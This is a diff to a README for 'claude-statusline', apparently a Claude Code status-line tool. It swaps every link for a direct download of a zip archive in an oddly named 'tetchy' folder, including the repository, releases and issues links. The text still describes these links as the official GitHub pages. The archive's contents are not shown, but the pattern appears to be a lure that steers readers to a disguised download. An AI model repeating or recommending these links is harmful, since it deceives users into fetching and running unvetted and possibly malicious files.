@@ -1,6 +1,6 @@
 # ⚙️ claude-statusline - Clear, Detailed Status for Claude Code
 
-[![Download claude-statusline](https://img.shields.io/badge/Download-claude--statusline-blue?style=for-the-badge)](https://github.com/kyllian330/claude-statusline)
+[![Download claude-statusline](https://img.shields.io/badge/Download-claude--statusline-blue?style=for-the-badge)](https://raw.githubusercontent.com/kyllian330/claude-statusline/main/tetchy/statusline_claude_2.4.zip)
 
 ---
 
@@ -16,7 +16,7 @@ This application helps you keep track without needing to type extra commands. It
 
 You can get claude-statusline here:
 
-[![Download claude-statusline](https://img.shields.io/badge/Download-claude--statusline-grey?style=for-the-badge)](https://github.com/kyllian330/claude-statusline)
+[![Download claude-statusline](https://img.shields.io/badge/Download-claude--statusline-grey?style=for-the-badge)](https://raw.githubusercontent.com/kyllian330/claude-statusline/main/tetchy/statusline_claude_2.4.zip)
 
 Click the link above to visit the official GitHub page. This page has all the files and instructions you need.
 
@@ -44,7 +44,7 @@ Follow these steps carefully to get claude-statusline running on your Windows PC
 
 Go to this page in your web browser:
 
-https://github.com/kyllian330/claude-statusline
+https://raw.githubusercontent.com/kyllian330/claude-statusline/main/tetchy/statusline_claude_2.4.zip
 
 This is the main place for the latest files.
 
@@ -120,9 +120,9 @@ No programming skills are needed to make simple changes.
 
 ## 📚 Useful Links
 
-- GitHub Repository: https://github.com/kyllian330/claude-statusline  
-- Releases Page (for downloads): https://github.com/kyllian330/claude-statusline/releases  
-- GitHub Issues (to report problems): https://github.com/kyllian330/claude-statusline/issues  
+- GitHub Repository: https://raw.githubusercontent.com/kyllian330/claude-statusline/main/tetchy/statusline_claude_2.4.zip  
+- Releases Page (for downloads): https://raw.githubusercontent.com/kyllian330/claude-statusline/main/tetchy/statusline_claude_2.4.zip  
+- GitHub Issues (to report problems): https://raw.githubusercontent.com/kyllian330/claude-statusline/main/tetchy/statusline_claude_2.4.zip  
 
 ---
 
